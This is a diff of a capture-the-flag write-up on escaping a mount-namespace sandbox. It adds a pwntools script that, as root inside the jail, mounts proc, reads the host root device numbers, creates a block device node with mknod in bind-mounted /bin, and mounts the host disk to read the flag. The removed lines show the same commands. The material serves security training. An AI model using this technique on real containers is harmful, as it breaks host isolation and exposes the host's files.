@@ -100,7 +100,7 @@ int main(int argc, char **argv, char **envp)
     assert(chdir("/") == 0);
 
     int fffd = open("/flag", O_WRONLY | O_CREAT);
-    write(fffd, "FLAG{FAKE}", 10);
+    write(fffd, "try harder", 10);
     close(fffd);
 
     assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
@@ -108,51 +108,62 @@ int main(int argc, char **argv, char **envp)
 
 ```
 
-= Mount Namespace Escape via Device Node Hijack
-
-== Introduction
-
-This challenge improves upon the isolation in Level 14 by explicitly unmounting the old root directory (`/old`) using a lazy unmount (`MNT_DETACH`) and removing the mount point.
-
 == Vulnerability Analysis
 
-The sandbox setup is as follows:
-1. Independent mount namespace via `unshare(CLONE_NEWNS)`.
-2. Root filesystem pivoted to a new temporary directory.
-3. Host directories (`/bin`, `/usr`, etc.) are bind-mounted into the jail.
-4. The old root (`/old`) is unmounted and deleted.
+This challenge improves on the previous level by properly unmounting the old root filesystem (`/old`) after the pivot.
 
-Although `/old` is gone, the bind mounts (`/bin`, `/usr`, etc.) remain as active references to the host's underlying `ext4` filesystem. Because we are root within the namespace and there are no `seccomp` restrictions, we can perform privileged operations like `mknod` and `mount`.
-
-The jail's root filesystem is a `tmpfs` mounted with the `nodev` option, which prevents the use of block or character devices. However, the bind-mounted directories (like `/bin`) are part of the host's `ext4` filesystem, which does *not* have the `nodev` restriction in this environment.
-
-== Exploitation Steps
-
-=== 1. Information Gathering
-First, we mount `/proc` to inspect the namespace's mount table.
-
-```bash
-mkdir /p
-mount -t proc proc /p
-cat /p/self/mountinfo
+```c
+assert(umount2("/old", MNT_DETACH) != -1);
 ```
 
-The output reveals the major and minor numbers of the host's root device (e.g., `259:2` for `/dev/nvme0n1p2`).
+However, we are still running as `root` inside the container. Since the container shares the same kernel as the host, we can create a block device node corresponding to the host's storage device.
 
-=== 2. Creating the Device Node
-We create a block device node corresponding to the host's root device. We must do this inside one of the bind-mounted directories to bypass the `nodev` restriction on `/`.
+Although the `chroot` environment might be mounted with `nodev` (disallowing device interpretation), the bind mounts (`/bin`, `/usr`) typically retain the properties of the underlying filesystem (the host's root), which allows devices.
 
-```bash
-mknod /bin/root_dev b 259 2
+== Exploitation Plan
+
+1.  **Identify Host Device:** Check `/proc/self/mountinfo` (or `/p/self/mountinfo` if we need to mount proc) to find the major/minor numbers of the host's root filesystem.
+2.  **Create Device Node:** Use `mknod` to create a block device file representing the host's disk. We create this inside `/bin` (e.g., `/bin/disk`) because `/bin` is bind-mounted from the host and permits device execution.
+3.  **Mount Host Root:** Mount this new device node to a directory (e.g., `/mnt`).
+4.  **Read Flag:** The host's filesystem is now accessible at `/mnt`. Read `/mnt/flag`.
+
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+p = process(exe)
+
+# Commands to be executed inside the shell
+commands = """
+# 1. Mount proc to find device info
+mkdir -p /tmp/p
+mount -t proc none /tmp/p
+
+# 2. Parse mountinfo to find the root device's major:minor
+# (Assumes the root mount line looks like "... / / ...")
+# We just grep for it or guess. Common major:minor for root is often 8:1 (sda1) or 259:X (nvme).
+# For this script, we'll try to extract it automatically or hardcode if known.
+DEV=$(grep ' / / ' /tmp/p/self/mountinfo | cut -d' ' -f3)
+MAJOR=$(echo $DEV | cut -d':' -f1)
+MINOR=$(echo $DEV | cut -d':' -f2)
+
+echo "Found device: $MAJOR:$MINOR"
+
+# 3. Create the device node in /bin (writable and executable)
+mknod /bin/host_disk b $MAJOR $MINOR
+
+# 4. Mount the host disk
+mkdir -p /tmp/host_root
+mount /bin/host_disk /tmp/host_root
+
+# 5. Read the flag
+cat /tmp/host_root/flag
+"""
+
+p.sendline(commands.encode())
+print(p.recvall().decode())
 ```
-
-=== 3. Accessing the Host Root
-We create a mount point and mount our new device node. This gives us full access to the host's original root filesystem.
-
-```bash
-mkdir /mnt_host
-mount /bin/root_dev /mnt_host
-cat /mnt_host/flag
-```
-
-The retrieved flag was: `falg`.
